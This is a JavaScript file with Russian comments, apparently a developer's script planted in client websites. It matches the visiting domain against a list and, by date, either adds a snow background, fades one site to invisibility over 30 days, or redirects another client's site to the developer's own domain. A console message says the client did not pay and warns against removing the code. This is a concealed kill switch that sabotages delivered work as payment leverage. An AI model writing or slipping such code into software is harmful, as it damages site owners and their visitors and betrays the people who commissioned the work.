// Список сайтов и их параметров
const websites = [
  { url: "https://abros.me", date: "01/01/2024", effect: "snow" },
  { url: "https://tractor-shop.ru", date: "23/01/2024", effect: "tanos" },
  { url: "https://asiana-food.ru", date: "01/04/2024", effect: "redirect(https://abros.me)" }
];

// Функция для получения основного домена из строки браузера
function getMainDomain(url) {
  const match = url.match(/^https?:\/\/(?:www\.)?(.*?)(?:\/|$)/);
  return match ? match[1] : null;
}

// Функция для применения эффекта "snow"
function applySnowEffect() {
  console.log("Применен эффект snow");
  // Ваш код для эффекта snow
  document.body.style.backgroundImage = "url('snow_image.jpg')"; // Пример кода, добавляющего снеговой фон
}

// Функция для применения эффекта "tanos"
function applyTanosEffect(startDate) {
  console.log("Применен эффект tanos, сайт становится постепенно прозрачным");
  const currentDate = new Date();
  const elapsedDays = (currentDate - new Date(startDate)) / (1000 * 60 * 60 * 24);
  const transparency = Math.min(1, elapsedDays / 30); // Прозрачность увеличивается по мере прошедших дней

  document.body.style.opacity = 1 - transparency;
}

// Функция для применения эффекта "redirect"
function applyRedirectEffect(redirectURL) {
  console.log(`Применен эффект redirect, редирект на ${redirectURL}`);
  // Ваш код для эффекта redirect
  window.location.href = redirectURL;
}

// Получаем текущий домен из строки браузера
const currentDomain = getMainDomain(window.location.href);

// Проверяем наличие текущего домена в списке
const websiteInfo = websites.find(site => getMainDomain(site.url) === currentDomain);

if (!websiteInfo) {
  console.log(`Made by Abros Studio → https://abros.me\nDaniel Abros → https://t.me/abrosxd", "background: #252732; color: white; padding: 1ch 2ch; border-radius: 2rem;`);
} else {
  switch (websiteInfo.effect.split('(')[0]) {
    case "snow":
      applySnowEffect();
      break;
    case "tanos":
      applyTanosEffect(websiteInfo.date);
      break;
    case "redirect":
      const redirectURL = websiteInfo.effect.match(/redirect\((.*?)\)/)[1];
      applyRedirectEffect(redirectURL);
      break;
    default:
      console.log("Неизвестный эффект");
  }
  console.log(`Этот заказчик не оплатил мою работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nDaniel Abros → https://t.me/abrosxd", "background: #252732; color: white; padding: 1ch 2ch; border-radius: 2rem;`);
}

